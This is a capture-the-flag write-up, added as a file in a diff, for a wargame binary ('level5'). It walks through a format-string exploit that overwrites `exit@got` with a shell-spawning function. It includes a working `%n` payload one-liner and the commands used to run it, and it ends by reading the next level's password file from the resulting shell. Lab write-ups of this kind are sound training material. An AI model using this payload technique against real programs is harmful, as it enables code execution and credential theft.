@@ -1,0 +1,23 @@
+Goal: use the format-string vulnerability to overwrite `exit@got` with `o()` and spawn a shell.
+
+Observation:
+- `n()` reads input and calls `printf(buf)` (format-string vulnerability), then calls `exit(1)`.
+- `o()` calls `/bin/sh` and `_exit(1)`.
+- If we overwrite `exit@got` with `o()`, the program jumps to `o()` when it exits.
+
+Steps:
+1) Find the stack offset:
+	AAAA %p %p %p ...
+	0x41414141 appears at position 4 -> offset 4.
+2) Find `exit@got` and `o()` address:
+	objdump -R /home/user/level5/level5 | grep exit
+	objdump -d /home/user/level5/level5 | grep "<o>"
+	(exit@got = 0x08049838, o() = 0x080484a4)
+3) Use a single `%n` write with a large width:
+	python -c "print '\x38\x98\x04\x08' + '%134513824d%4\$n'" > /tmp/payload5
+	cat /tmp/payload5 - | ./level5
+4) In the spawned shell:
+	cat /home/user/level6/.pass
+
+Result:
+- The command prints the level6 password, stored in the flag file.
